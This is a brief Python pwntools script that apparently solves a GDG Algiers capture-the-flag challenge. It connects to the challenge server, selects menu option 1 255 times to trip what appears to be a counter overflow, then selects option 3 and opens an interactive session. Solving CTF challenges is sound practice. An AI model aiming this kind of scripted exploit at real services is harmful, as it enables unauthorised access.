from pwn import *

p = remote('pwn.chal.ctf.gdgalgiers.com', 1402)


for i in range(255):
  p.sendlineafter('Exit\n', '1')

p.sendlineafter('Exit\n', '3')

p.interactive()

